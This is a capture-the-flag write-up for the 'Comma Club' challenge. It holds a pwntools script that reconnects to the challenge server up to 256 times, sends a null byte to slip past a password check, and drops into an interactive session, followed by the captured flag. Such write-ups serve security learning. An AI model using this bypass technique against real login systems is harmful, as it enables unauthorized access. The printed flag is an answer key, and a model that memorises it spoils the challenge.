# Comma Club

Solved by: @jeepee

## Question:
We need somone to run our vote tallying machine, and it needs to be someone trustworthy. Apparently there's some problem if a candidate gets too many votes. Shouldn't be a problem for us in Wyoming though.

## Solution:
```
#!/usr/bin/python
from pwn import *
import warnings
import time

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./challenge')
libc = exe.libc

host = "comma-club.chal.hackthe.vote"
port = 1337

gdb_script = '''

'''

r = lambda x: p.recv(x)
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
cl = lambda: p.clean(timeout=1)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

def debug():
  gdb.attach(p)
  p.interactive()

# p = exe.process()
#p = remote(host,port)
#p = gdb.debug('./', gdbscript = gdb_script)

for i in range(256):
  # p = exe.process()
  p = remote(host, port)
  sl("3")
  sla(b"password\n> ", b"\x00")
  resp = rl()
  print(resp.decode())
  if b"Incorrect" in resp:
    p.close()
  else:
    p.interactive()

# flag{w3lc0me_2_TH3_2_c0mm4_c1ub}
```

Need to try few times and if you are lucky, will got the flag.

**Flag:** `flag{w3lc0me_2_TH3_2_c0mm4_c1ub}`
